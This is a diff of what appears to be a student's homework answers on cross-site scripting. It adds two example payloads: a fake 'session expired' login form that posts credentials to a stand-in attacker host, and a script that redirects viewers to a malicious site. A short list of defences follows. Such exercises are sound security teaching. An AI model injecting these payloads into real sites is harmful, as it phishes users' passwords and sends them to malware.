@@ -65,22 +65,31 @@
    ***Moriarty could inject a fake login form into a post. When Alice views the post, she might think it is legitimae and try to login. Her username and password will then go to Moriarty instead of the real FDF server.***
 
   ```
-  <form action="https://moriartys-server.com/steal-password" method="POST">
+  <form action="https://moriartysserver.com/steal-password" method="POST">
     <p>Your session has expired. Please log in again:</p>
     <input type="text" name="username" placeholder="Username">
     <input type="text" name="password" placeholder="Password">
     <button type="submit">Log In</button>
   </form>
-  
   ```
 
 3. A second attack that is more virulent than Moriarty's, but that's substantially different from my first idea.
-4.
-5.
-6. Questions:
 
-Do it again: describe a second attack that is more virulent than Moriarty's, but that's substantially different from your first idea.
+    ***Moriarty could inject JavaScript that automatically redirects users to a malicious website that he controls. This could be used to phish for credentials or distribute malware.***
 
-What techniques can the server or the browser use to prevent what Moriarty is doing?
+   ```
+    <script>
+        setTimeout(function() {
+            window.location.href = 'https://moriartysmaliciouswebsite.com';
+        }, 3000); 
+    </script>
+   ```
+
+5. Techniques to prevent what Moriarty is doing.
+
+* The server can ensure that all input data conforms to expected formats by removing potentially harmful characters before being stored in the database.
+* Test web applications for vulnerabilities to help identify potential XSS attacks.
+
+****END****
 
 
